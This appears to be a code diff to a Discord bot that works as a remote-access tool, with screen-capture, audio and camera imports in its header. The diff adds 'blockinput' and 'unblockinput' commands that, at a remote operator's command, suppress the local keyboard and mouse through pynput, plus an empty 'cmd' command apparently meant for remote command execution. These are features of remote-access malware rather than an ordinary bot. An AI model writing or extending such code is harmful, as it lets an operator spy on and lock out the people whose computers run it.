@@ -12,6 +12,8 @@ import cv2
 import mss  # Import mss for screen capture
 import numpy as np
 import pyaudio
+from pynput import keyboard, mouse
+from time import sleep
 
 # Load environment variables
 load_dotenv()
@@ -271,5 +273,29 @@ async def leave(ctx):
         await ctx.send('`Disconnected from the voice channel.`')
     else:
         await ctx.send("`The bot is not connected to any voice channel.`")
+@bot.command(name='blockinput')
+async def blockinput(ctx):
+    global keyboard_listener
+    global mouse_listener
+    async def on_press():
+        pass
+    async def on_release():
+        pass
+    async def on_click():
+        pass
+    keyboard_listener = keyboard.Listener(suppress=True)
+    mouse_listener = mouse.Listener(suppress=True)
+    keyboard_listener.start()
+    mouse_listener.start()
+    await ctx.send("`Blocked user input`")
+    
+@bot.command(name='unblockinput')
+async def unblockinput(ctx):
+    keyboard_listener.stop()
+    mouse_listener.stop()
+    await ctx.send('`Unblocked user input`')
+@bot.command(name='cmd')
+async def cmd(ctx, *args):
+    pass
 
 bot.run(TOKEN)
